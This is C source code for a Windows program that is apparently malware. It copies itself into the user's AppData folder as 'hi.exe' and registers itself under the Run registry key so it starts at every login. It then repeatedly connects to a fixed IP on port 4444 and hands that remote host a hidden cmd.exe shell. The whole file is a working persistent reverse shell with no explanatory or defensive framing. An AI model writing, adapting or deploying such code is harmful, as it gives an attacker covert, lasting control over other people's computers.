#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

int main() {

    //save
    char origin[MAX_PATH];
    GetModuleFileNameA(NULL, origin, MAX_PATH);
    
    char* appdata = getenv("APPDATA");
    
    if (appdata != NULL) {
        char destiny[MAX_PATH];
        snprintf(destiny, sizeof(destiny), "%s\\hi.exe", appdata);
        
        if (CopyFileA(origin, destiny, FALSE)) {
        
            char comando_reg[1024];
            snprintf(comando_reg, sizeof(comando_reg), 
                    "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"hi\" /t REG_SZ /d \"\\\"%s\\\"\" /f > nul", 
                    destiny);
            
            system(comando_reg);
        }
    }



    WSADATA wsa;
    sockaddr_in shell_addr;
    char ip[] = "192.168.1.8";
    int p = 4444;
    char command[] = "cmd.exe";

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    shell_addr.sin_port = htons(p);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip);

    while (true) {
        SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        
        if (shell != INVALID_SOCKET) {
            int con = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

            if (con != SOCKET_ERROR) {
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                
                ZeroMemory(&si, sizeof(si));
                ZeroMemory(&pi, sizeof(pi));
                
                si.cb = sizeof(si);
                si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                si.wShowWindow = SW_HIDE;
                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

                if (CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, INFINITE);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            
            closesocket(shell);
        }

        Sleep(5000);
    }
    WSACleanup();
    return 0;
}
